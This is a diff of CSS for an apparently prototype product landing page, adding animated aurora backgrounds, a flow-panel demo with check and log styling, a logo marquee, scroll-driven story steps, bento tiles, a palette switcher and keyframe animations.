-    background: radial-gradient(520px 260px at 50% 60%, rgba(61, 219, 217, 0.12), transparent 70%);
-    -webkit-mask-image: linear-gradient(transparent 5%, #000 55%);
-    mask-image: linear-gradient(transparent 5%, #000 55%);
+  .aurora i {
+    position: absolute;
+    border-radius: 50%;
+    opacity: 0.5;
+  }
+  .aurora i:nth-child(1) {
+    width: 620px;
+    height: 360px;
+    left: 52%;
+    top: 90px;
+    background: radial-gradient(closest-side, rgb(var(--a1) / 0.45), transparent);
+    animation: drift1 16s ease-in-out infinite;
+  }
+  .aurora i:nth-child(2) {
+    width: 520px;
+    height: 320px;
+    left: 68%;
+    top: 220px;
+    background: radial-gradient(closest-side, rgb(var(--a2) / 0.4), transparent);
+    animation: drift2 19s ease-in-out infinite;
+  }
+  .aurora i:nth-child(3) {
+    width: 480px;
+    height: 280px;
+    left: 8%;
+    top: 40px;
+    background: radial-gradient(closest-side, rgba(110, 130, 255, 0.18), transparent);
+    animation: drift1 22s ease-in-out infinite reverse;
+  }
+  .grid-bg {
+    position: absolute;
+    inset: 0 0 auto;
+    height: 720px;
+    z-index: -1;
+    background-image:
+      linear-gradient(to right, rgba(255, 255, 255, 0.035) 1px, transparent 1px),
+      linear-gradient(to bottom, rgba(255, 255, 255, 0.035) 1px, transparent 1px);
+    background-size: 64px 64px;
+    -webkit-mask-image: radial-gradient(ellipse 70% 60% at 65% 30%, #000 20%, transparent 75%);
+    mask-image: radial-gradient(ellipse 70% 60% at 65% 30%, #000 20%, transparent 75%);
+  }
+  .hero-grid {
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) 320px;
+    align-items: center;
+    gap: 40px;
+  }
+  .hero-copy {
+    min-width: 0;
+  }
+  .hero-mark {
+    position: relative;
+    display: grid;
+    place-items: center;
+    height: 340px;
+  }
+  .mark-halo {
+    position: absolute;
+    inset: 20px;
+    border-radius: 50%;
+    background: radial-gradient(closest-side, rgb(var(--a1) / 0.18), rgb(var(--a2) / 0.1) 55%, transparent);
+    animation: halo 5s ease-in-out infinite;
+  }
+  .hero-mark :global(.tw-mark) {
+    position: relative;
+    animation: bob 6s ease-in-out infinite;
+  }
+  @media (max-width: 900px) {
+    .hero-grid {
+      grid-template-columns: 1fr;
+    }
+    .h-hero .line {
+      white-space: normal;
+    }
+    .hero-mark {
+      display: none;
+    }
   }
   .announce {
-    position: relative;
     display: inline-flex;
     align-items: center;
     gap: 10px;
@@ -479,6 +755,7 @@ const story = [
     font-size: 13px;
     color: var(--muted);
     background: rgba(255, 255, 255, 0.02);
+    animation: rise 700ms cubic-bezier(0.2, 0.7, 0.2, 1) both;
   }
   .announce:hover {
     color: var(--text);
@@ -487,36 +764,42 @@ const story = [
     width: 6px;
     height: 6px;
     border-radius: 99px;
-    background: var(--accent);
-    box-shadow: 0 0 10px var(--accent);
+    background: rgb(var(--a1));
+    box-shadow: 0 0 10px rgb(var(--a1));
+    animation: blink 2s ease-in-out infinite;
   }
   .announce .chev {
     color: var(--faint);
   }
   .h-hero {
-    position: relative;
     margin: 28px 0 0;
-    font-size: clamp(40px, 6.4vw, 76px);
-    line-height: 1.08;
+    font-size: clamp(38px, 5.2vw, 66px);
+    line-height: 1.1;
     font-weight: 600;
     letter-spacing: -0.035em;
+  }
+  .h-hero .line {
+    display: block;
+    white-space: nowrap;
     background: linear-gradient(180deg, #fff 30%, #b9bec6);
     -webkit-background-clip: text;
     background-clip: text;
     color: transparent;
+    animation: reveal 900ms cubic-bezier(0.2, 0.7, 0.2, 1) both;
+    animation-delay: calc(var(--d) * 140ms + 100ms);
   }
-  .hero-row {
-    position: relative;
-    margin-top: 28px;
-    display: flex;
-    flex-wrap: wrap;
-    align-items: flex-end;
-    justify-content: space-between;
-    gap: 24px 48px;
+  .h-hero .line .grad {
+    background: linear-gradient(90deg, rgb(var(--a1)), rgb(var(--a2)));
+    -webkit-background-clip: text;
+    background-clip: text;
+  }
+  .rise {
+    animation: rise 800ms cubic-bezier(0.2, 0.7, 0.2, 1) both;
+    animation-delay: calc(var(--d) * 140ms + 100ms);
   }
   .lede {
-    margin: 0;
-    max-width: 560px;
+    margin: 26px 0 0;
+    max-width: 580px;
     font-size: 18px;
     line-height: 1.65;
     color: var(--muted);
@@ -527,13 +810,13 @@ const story = [
     text-wrap: balance;
   }
   .hero-actions {
+    margin-top: 32px;
     display: flex;
     flex-wrap: wrap;
     gap: 12px;
   }
   .hero-actions.center {
     justify-content: center;
-    margin-top: 32px;
   }
 
   /* Flow panel */
@@ -542,10 +825,9 @@ const story = [
     margin: 64px 0 0;
     border: 1px solid var(--line-2);
     border-radius: 16px;
-    background: linear-gradient(180deg, rgba(20, 21, 24, 0.9), rgba(12, 13, 15, 0.9));
+    background: linear-gradient(180deg, rgba(20, 21, 24, 0.92), rgba(12, 13, 15, 0.92));
     box-shadow:
-      0 0 0 1px rgba(255, 255, 255, 0.02) inset,
-      0 40px 120px -40px rgba(61, 219, 217, 0.25),
+      0 40px 120px -40px rgb(var(--a1) / 0.28),
       0 30px 80px -30px rgba(0, 0, 0, 0.8);
     overflow: hidden;
   }
@@ -554,7 +836,9 @@ const story = [
     position: absolute;
     inset: 0 0 auto;
     height: 1px;
-    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent);
+    background: linear-gradient(90deg, transparent, rgb(var(--a1) / 0.8), rgb(var(--a2) / 0.8), transparent);
+    background-size: 200% 100%;
+    animation: sweep 6s linear infinite;
   }
   .flow-top {
     display: flex;
@@ -578,6 +862,20 @@ const story = [
   .flow-title {
     flex: 1;
   }
+  .scenes {
+    display: inline-flex;
+    gap: 5px;
+  }
+  .scenes i {
+    width: 18px;
+    height: 3px;
+    border-radius: 3px;
+    background: #2a2c31;
+    transition: background 300ms;
+  }
+  .scenes i[data-on] {
+    background: rgb(var(--a1));
+  }
   .live {
     display: inline-flex;
     align-items: center;
@@ -585,20 +883,19 @@ const story = [
     font-family: var(--font-mono);
     font-size: 11px;
     letter-spacing: 0.08em;
-    color: var(--accent);
+    color: rgb(var(--a1));
   }
   .live i {
     width: 6px;
     height: 6px;
     border-radius: 99px;
-    background: var(--accent);
+    background: rgb(var(--a1));
     animation: blink 1.6s ease-in-out infinite;
   }
   .flow-grid {
     display: grid;
-    grid-template-columns: 1fr 60px 1.3fr 60px 1fr;
+    grid-template-columns: 1fr 64px 1.3fr 64px 1fr;
     align-items: center;
-    gap: 0;
     padding: 32px 28px 20px;
   }
   .col {
@@ -618,16 +915,24 @@ const story = [
     font-size: 13px;
     color: var(--faint);
     background: rgba(255, 255, 255, 0.015);
+    transition: color 300ms, border-color 300ms, background 300ms, box-shadow 300ms;
   }
   .node.on {
     color: var(--text);
-    border-color: rgba(61, 219, 217, 0.45);
-    background: rgba(61, 219, 217, 0.06);
+    border-color: rgb(var(--a1) / 0.5);
+    background: rgb(var(--a1) / 0.07);
+    box-shadow: 0 0 24px -8px rgb(var(--a1) / 0.6);
+  }
+  .node.fail {
+    color: var(--warn);
+    border-color: rgba(245, 180, 84, 0.5);
+    background: rgba(245, 180, 84, 0.07);
+    text-decoration: line-through;
   }
   .wire {
     position: relative;
     height: 1px;
-    background: linear-gradient(90deg, rgba(61, 219, 217, 0.1), rgba(61, 219, 217, 0.5), rgba(61, 219, 217, 0.1));
+    background: linear-gradient(90deg, rgb(var(--a1) / 0.1), rgb(var(--a1) / 0.55), rgb(var(--a2) / 0.2));
   }
   .packet {
     position: absolute;
@@ -636,22 +941,33 @@ const story = [
     width: 7px;
     height: 7px;
     border-radius: 99px;
-    background: var(--accent);
-    box-shadow: 0 0 12px var(--accent);
+    background: rgb(var(--a1));
+    box-shadow: 0 0 12px rgb(var(--a1));
     opacity: 0;
   }
+  .packet.p2 {
+    background: rgb(var(--a2));
+    box-shadow: 0 0 12px rgb(var(--a2));
+  }
   .flow[data-running] .packet {
-    animation: travel 1.2s ease-in-out infinite;
+    animation: travel 1.1s ease-in-out infinite;
+  }
+  .flow[data-running] .packet.p2 {
+    animation-delay: 0.45s;
   }
   .flow[data-running] .packet.late {
-    animation-delay: 0.6s;
+    animation-delay: 0.55s;
+  }
+  .flow[data-running] .packet.late.p2 {
+    animation-delay: 1s;
   }
   .gw {
+    position: relative;
     border: 1px solid var(--line-2);
     border-radius: 14px;
     padding: 16px;
     background: var(--panel-2);
-    box-shadow: 0 0 60px -20px rgba(61, 219, 217, 0.35);
+    box-shadow: 0 0 60px -20px rgb(var(--a1) / 0.4);
   }
   .gw-head {
     display: flex;
@@ -670,8 +986,8 @@ const story = [
   }
   .checks li {
     display: flex;
-    justify-content: space-between;
-    gap: 12px;
+    align-items: center;
+    gap: 10px;
     font-size: 13px;
     color: var(--faint);
     transition: color 300ms;
@@ -680,35 +996,45 @@ const story = [
     content: "";
     width: 6px;
     height: 6px;
-    margin-top: 7px;
-    margin-right: -4px;
     border-radius: 99px;
     background: #2a2c31;
     transition: background 300ms, box-shadow 300ms;
+  }
+  .checks b {
+    font-weight: 400;
   }
   .checks li span {
     margin-left: auto;
     font-family: var(--font-mono);
     font-size: 12px;
     opacity: 0;
-    transition: opacity 300ms;
+    transform: translateX(6px);
+    transition: opacity 300ms, transform 300ms;
   }
   .checks li[data-on] {
     color: var(--text);
   }
   .checks li[data-on]::before {
-    background: var(--accent);
-    box-shadow: 0 0 8px var(--accent);
+    background: rgb(var(--a1));
+    box-shadow: 0 0 8px rgb(var(--a1));
   }
   .checks li[data-on] span {
     opacity: 1;
+    transform: none;
     color: var(--muted);
   }
   .checks li.warn[data-on]::before {
+    background: var(--warn);
+    box-shadow: 0 0 8px var(--warn);
+  }
+  .checks li.warn[data-on] span {
+    color: var(--warn);
+  }
+  .checks li.bad[data-on]::before {
     background: var(--danger);
     box-shadow: 0 0 8px var(--danger);
   }
-  .checks li.warn[data-on] span {
+  .checks li.bad[data-on] span {
     color: var(--danger);
   }
   .log {
@@ -720,34 +1046,40 @@ const story = [
     font-size: 12.5px;
     line-height: 2;
     color: var(--muted);
+    min-height: 152px;
   }
   .log li {
     display: flex;
     gap: 16px;
-    opacity: 0.18;
-    transition: opacity 400ms;
+    opacity: 0;
+    transform: translateY(4px);
+    transition: opacity 350ms, transform 350ms;
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
   }
   .log li[data-on] {
     opacity: 1;
+    transform: none;
   }
-  .log time {
+  .log :global(time) {
     flex: 0 0 72px;
     color: var(--faint);
   }
-  .log b {
+  .log :global(b) {
     font-weight: 500;
     color: var(--text);
   }
-  .log code {
+  .log :global(code) {
     color: #e5c07b;
   }
-  .log li.bad code {
+  .log :global(em.w) {
+    font-style: normal;
+    color: var(--warn);
+  }
+  .log :global(code.x) {
     color: var(--danger);
     text-decoration: line-through;
-    text-decoration-color: rgba(255, 107, 107, 0.6);
   }
   @media (max-width: 760px) {
     .flow-grid {
@@ -768,7 +1100,7 @@ const story = [
       padding: 12px 16px 18px;
       font-size: 11.5px;
     }
-    .log time {
+    .log :global(time) {
       flex-basis: 56px;
     }
   }
@@ -777,7 +1109,7 @@ const story = [
   .wall {
     border-top: 1px solid var(--line);
     border-bottom: 1px solid var(--line);
-    padding: 36px 0;
+    padding: 34px 0;
   }
   .wall-label {
     margin: 0 0 18px;
@@ -785,18 +1117,26 @@ const story = [
     font-size: 13px;
     color: var(--faint);
   }
-  .wall-list {
+  .marquee {
+    overflow: hidden;
+    -webkit-mask-image: linear-gradient(90deg, transparent, #000 12%, #000 88%, transparent);
+    mask-image: linear-gradient(90deg, transparent, #000 12%, #000 88%, transparent);
+  }
+  .track {
+    display: flex;
+    width: max-content;
+    gap: 56px;
     margin: 0;
     padding: 0;
     list-style: none;
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 12px 30px;
-    font-size: 15.5px;
+    font-size: 17px;
     font-weight: 560;
     letter-spacing: -0.01em;
     color: #9ca1a9;
+    animation: marquee 38s linear infinite;
+  }
+  .marquee:hover .track {
+    animation-play-state: paused;
   }
 
   /* Section heads */
@@ -807,6 +1147,7 @@ const story = [
     line-height: 1.12;
     font-weight: 600;
     letter-spacing: -0.03em;
+    text-wrap: balance;
   }
 
   /* Ideas */
@@ -839,7 +1180,25 @@ const story = [
     width: 100%;
     max-width: 240px;
     margin: 18px auto 26px;
-    color: #5b6068;
+    overflow: visible;
+  }
+  .ink {
+    fill: none;
+    stroke: #5b6068;
+    stroke-width: 1;
+  }
+  .ink.hot {
+    stroke: rgb(var(--a1));
+    filter: drop-shadow(0 0 6px rgb(var(--a1) / 0.5));
+  }
+  .float {
+    animation: float 7s ease-in-out infinite;
+  }
+  .f2 {
+    animation-delay: -2s;
+  }
+  .f3 {
+    animation-delay: -4s;
   }
   .idea h3,
   .step h3,
@@ -880,29 +1239,51 @@ const story = [
     grid-template-columns: minmax(0, 0.8fr) minmax(0, 1.2fr);
     gap: 64px;
   }
+  .story-steps {
+    position: relative;
+  }
+  .rail {
+    position: absolute;
+    left: 0;
+    top: 150px;
+    bottom: 0;
+    width: 1px;
+    background: var(--line);
+  }
+  .rail i {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(rgb(var(--a1)), rgb(var(--a2)));
+    transform-origin: top;
+    transform: scaleY(0);
+    box-shadow: 0 0 10px rgb(var(--a1) / 0.6);
+  }
   .step {
     min-height: 62vh;
     display: flex;
     flex-direction: column;
     justify-content: center;
-    border-left: 1px solid var(--line);
-    padding-left: 24px;
-    opacity: 0.35;
-    transition: opacity 400ms, border-color 400ms;
-  }
-  .step:first-of-type {
-    margin-top: 24px;
+    padding-left: 28px;
+    opacity: 0.32;
+    transition: opacity 400ms;
   }
   .step[data-active] {
     opacity: 1;
-    border-color: var(--accent);
   }
   .step-tag {
-    margin: 0 0 10px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 0 0 12px;
+    font-size: 13px;
+    color: rgb(var(--a1));
+  }
+  .step-tag span {
     font-family: var(--font-mono);
-    font-size: 12px;
-    letter-spacing: 0.06em;
-    color: var(--accent);
+    font-size: 11px;
+    border: 1px solid rgb(var(--a1) / 0.4);
+    border-radius: 6px;
+    padding: 1px 6px;
   }
   .step h3 {
     font-size: 26px;
@@ -915,20 +1296,20 @@ const story = [
     line-height: 1.7;
     color: var(--muted);
   }
-  .story-screen {
-    position: relative;
-  }
   .screen {
     position: sticky;
     top: calc(50vh - 220px);
     aspect-ratio: 2360 / 1540;
+    max-width: 100%;
     border-radius: 14px;
     box-shadow:
       0 0 0 1px var(--line-2),
       0 50px 120px -40px rgba(0, 0, 0, 0.9),
-      0 30px 100px -50px rgba(61, 219, 217, 0.3);
+      0 30px 100px -40px rgb(var(--a1) / 0.35);
     overflow: hidden;
     background: var(--panel);
+    transition: transform 300ms ease-out;
+    will-change: transform;
   }
   .screen img {
     position: absolute;
@@ -937,23 +1318,26 @@ const story = [
     height: 100%;
     object-fit: cover;
     opacity: 0;
-    transform: scale(1.02);
-    transition: opacity 500ms, transform 700ms;
+    transform: scale(1.03);
+    filter: blur(4px);
+    transition: opacity 550ms, transform 800ms, filter 550ms;
   }
   .screen img[data-active] {
     opacity: 1;
     transform: none;
+    filter: none;
   }
   @media (max-width: 900px) {
     .story-grid {
       grid-template-columns: 1fr;
     }
-    .story-screen {
+    .story-screen,
+    .rail {
       display: none;
     }
     .step {
       min-height: 0;
-      padding: 28px 0 28px 20px;
+      padding: 28px 0;
       opacity: 1;
     }
   }
@@ -969,13 +1353,22 @@ const story = [
     gap: 12px;
   }
   .tile {
+    --mx: -200px;
+    --my: -200px;
     position: relative;
     overflow: hidden;
     border-radius: 16px;
     border: 1px solid var(--line);
     background: linear-gradient(180deg, var(--panel-2), var(--panel));
     padding: 28px;
-    transition: border-color 200ms;
+    transition: border-color 200ms, transform 300ms;
+  }
+  .tile::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(360px circle at var(--mx) var(--my), rgb(var(--a1) / 0.1), transparent 60%);
+    pointer-events: none;
   }
   .tile:hover {
     border-color: var(--line-2);
@@ -988,11 +1381,37 @@ const story = [
     gap: 24px;
     align-items: end;
   }
+  .chip-bar {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 24px;
+    border: 1px solid var(--line-2);
+    border-radius: 8px;
+    padding: 6px 10px;
+    background: rgba(255, 255, 255, 0.03);
+  }
+  .chip-nums {
+    display: flex;
+    flex-direction: column;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    line-height: 1.15;
+    text-align: right;
+    font-variant-numeric: tabular-nums;
+  }
+  .chip-nums b {
+    font-weight: 500;
+  }
   .t-menubar .menu-shot {
     width: 260px;
     margin-bottom: -60px;
     border-radius: 12px;
     box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--line-2);
+    transition: transform 500ms cubic-bezier(0.2, 0.7, 0.2, 1);
+  }
+  .t-menubar:hover .menu-shot {
+    transform: translateY(-14px);
   }
   .t-cost,
   .t-formats,
@@ -1008,12 +1427,28 @@ const story = [
     align-items: center;
     padding: 0 28px 0 0;
   }
-  .t-mcp .crop {
+  .crop-wrap {
+    position: relative;
     height: 100%;
     min-height: 220px;
+    overflow: hidden;
+    border-right: 1px solid var(--line);
+  }
+  .crop {
+    width: 100%;
+    height: 100%;
     object-fit: cover;
     object-position: left top;
-    border-right: 1px solid var(--line);
+  }
+  .scan {
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    height: 60px;
+    background: linear-gradient(transparent, rgb(var(--a1) / 0.18), transparent);
+    border-bottom: 1px solid rgb(var(--a1) / 0.6);
+    animation: scan 3.6s ease-in-out infinite;
   }
   .big {
     margin: 0 !important;
@@ -1022,12 +1457,16 @@ const story = [
     letter-spacing: -0.03em;
     color: var(--text) !important;
     line-height: 1.1 !important;
+    font-variant-numeric: tabular-nums;
   }
   .big-sub {
     margin: 6px 0 22px !important;
     font-family: var(--font-mono);
     font-size: 12px !important;
     color: #e5c07b !important;
+  }
+  :global(.tick) {
+    animation: tick 600ms ease-out;
   }
   .chips {
     display: flex;
@@ -1065,8 +1504,12 @@ const story = [
     font-family: var(--font-mono);
   }
   .remote-art .dash {
-    stroke: var(--accent);
+    stroke: rgb(var(--a1));
     animation: dash 1.2s linear infinite;
+  }
+  .dot-run {
+    fill: rgb(var(--a2));
+    filter: drop-shadow(0 0 4px rgb(var(--a2)));
   }
   .keyrows {
     margin: 0 0 22px;
@@ -1090,6 +1533,7 @@ const story = [
   .keyrows em {
     font-style: normal;
     color: var(--text);
+    font-variant-numeric: tabular-nums;
   }
   @media (max-width: 900px) {
     .bento {
@@ -1116,25 +1560,65 @@ const story = [
     }
   }
 
+  /* Entrances: the script marks the page (.js-reveal) and each block as it comes
+     into view (data-in). Only position moves, so a block is readable whether or
+     not the script ran; line art draws only once the script has armed it. */
+  .js-reveal .reveal {
+    transform: translateY(28px);
+    transition: transform 900ms cubic-bezier(0.2, 0.7, 0.2, 1);
+  }
+  .js-reveal .reveal[data-in] {
+    transform: none;
+  }
+  .js-reveal .reveal .ink {
+    stroke-dasharray: 1;
+    stroke-dashoffset: 1;
+    transition: stroke-dashoffset 1400ms cubic-bezier(0.4, 0, 0.2, 1) 200ms;
+  }
+  .js-reveal .reveal[data-in] .ink {
+    stroke-dashoffset: 0;
+  }
+
   /* CTA */
   .cta {
     position: relative;
     border-top: 1px solid var(--line);
-    padding: 120px 0 140px;
+    padding: 110px 0 130px;
     overflow: hidden;
+  }
+  .cta-glow {
+    position: absolute;
+    left: 50%;
+    top: 40%;
+    width: 900px;
+    height: 460px;
+    translate: -50% -50%;
+    background:
+      radial-gradient(closest-side at 40% 50%, rgb(var(--a1) / 0.16), transparent),
+      radial-gradient(closest-side at 60% 55%, rgb(var(--a2) / 0.13), transparent);
+    filter: blur(30px);
+    animation: halo 6s ease-in-out infinite;
   }
   .cta-inner {
     position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
     text-align: center;
   }
   .h-cta {
-    margin: 0;
+    margin: 22px 0 0;
     font-size: clamp(36px, 5vw, 60px);
     font-weight: 600;
     letter-spacing: -0.035em;
   }
+  .cta .hero-actions {
+    margin-top: 32px;
+  }
   .cmd {
-    display: inline-block;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
     margin-top: 36px;
     border: 1px solid var(--line-2);
     border-radius: 12px;
@@ -1145,9 +1629,16 @@ const story = [
     background: rgba(255, 255, 255, 0.02);
     max-width: 100%;
     overflow-wrap: anywhere;
+    text-align: left;
   }
   .cmd span {
     color: var(--faint);
+  }
+  .caret {
+    width: 7px;
+    height: 16px;
+    background: rgb(var(--a1));
+    animation: blink 1s steps(1) infinite;
   }
 
   .foot {
@@ -1161,9 +1652,73 @@ const story = [
     gap: 16px;
   }
 
+  /* Palette switcher (prototype only) */
+  .palette {
+    position: fixed;
+    right: 16px;
+    bottom: calc(16px + env(safe-area-inset-bottom, 0px));
+    z-index: 30;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border: 1px solid var(--line-2);
+    border-radius: 999px;
+    padding: 8px 10px 8px 14px;
+    background: rgba(15, 16, 18, 0.85);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 10px 40px -10px rgba(0, 0, 0, 0.8);
+  }
+  .palette-label {
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .sw {
+    width: 22px;
+    height: 22px;
+    border-radius: 99px;
+    border: 2px solid transparent;
+    cursor: pointer;
+    transition: transform 150ms, border-color 150ms;
+  }
+  .sw:hover {
+    transform: scale(1.12);
+  }
+  .sw[aria-pressed="true"] {
+    border-color: #fff;
+  }
+  .sw:focus-visible {
+    outline: 2px solid #fff;
+    outline-offset: 2px;
+  }
+  .sw-neon {
+    background: linear-gradient(135deg, #22e5f2, #f05cd8);
+  }
+  .sw-teal {
+    background: linear-gradient(135deg, #3ddbd9, #8eebea);
+  }
+  .sw-indigo {
+    background: linear-gradient(135deg, #818cf8, #c084fc);
+  }
+  .sw-amber {
+    background: linear-gradient(135deg, #fb923c, #facc15);
+  }
+
   @keyframes blink {
     50% {
       opacity: 0.3;
+    }
+  }
+  @keyframes rise {
+    from {
+      opacity: 0;
+      transform: translateY(14px);
+    }
+  }
+  @keyframes reveal {
+    from {
+      opacity: 0;
+      transform: translateY(22px);
+      filter: blur(8px);
     }
   }
   @keyframes travel {
@@ -1180,6 +1735,87 @@ const story = [
       opacity: 0;
     }
   }
+  @keyframes sweep {
+    to {
+      background-position: -200% 0;
+    }
+  }
+  @keyframes drift1 {
+    0%,
+    100% {
+      transform: translate(0, 0) scale(1);
+    }
+    50% {
+      transform: translate(-60px, 40px) scale(1.15);
+    }
+  }
+  @keyframes drift2 {
+    0%,
+    100% {
+      transform: translate(0, 0) scale(1);
+    }
+    50% {
+      transform: translate(50px, -30px) scale(0.9);
+    }
+  }
+  @keyframes halo {
+    0%,
+    100% {
+      opacity: 0.8;
+      transform: scale(1);
+    }
+    50% {
+      opacity: 1;
+      transform: scale(1.06);
+    }
+  }
+  @keyframes bob {
+    0%,
+    100% {
+      transform: translateY(0);
+    }
+    50% {
+      transform: translateY(-8px);
+    }
+  }
+  @keyframes float {
+    0%,
+    100% {
+      transform: translateY(0);
+    }
+    50% {
+      transform: translateY(-5px);
+    }
+  }
+  @keyframes shine {
+    0%,
+    60% {
+      transform: translateX(-120%);
+    }
+    80%,
+    100% {
+      transform: translateX(120%);
+    }
+  }
+  @keyframes marquee {
+    to {
+      transform: translateX(calc(-50% - 28px));
+    }
+  }
+  @keyframes scan {
+    0% {
+      top: -60px;
+    }
+    100% {
+      top: 100%;
+    }
+  }
+  @keyframes tick {
+    0% {
+      color: rgb(var(--a1));
+      text-shadow: 0 0 12px rgb(var(--a1) / 0.8);
+    }
+  }
   @keyframes chip {
     0%,
     100% {
@@ -1189,8 +1825,8 @@ const story = [
     12%,
     30% {
       color: var(--text);
-      border-color: rgba(61, 219, 217, 0.6);
-      box-shadow: 0 0 16px -4px rgba(61, 219, 217, 0.5);
+      border-color: rgb(var(--a1) / 0.6);
+      box-shadow: 0 0 16px -4px rgb(var(--a1) / 0.5);
     }
   }
   @keyframes dash {
@@ -1200,9 +1836,15 @@ const story = [
   }
   @media (prefers-reduced-motion: reduce) {
     .proto *,
-    .proto *::before {
+    .proto *::before,
+    .proto *::after {
       animation: none !important;
       transition: none !important;
+    }
+    .log li,
+    .checks li span {
+      opacity: 1;
+      transform: none;
     }
   }
 </style>
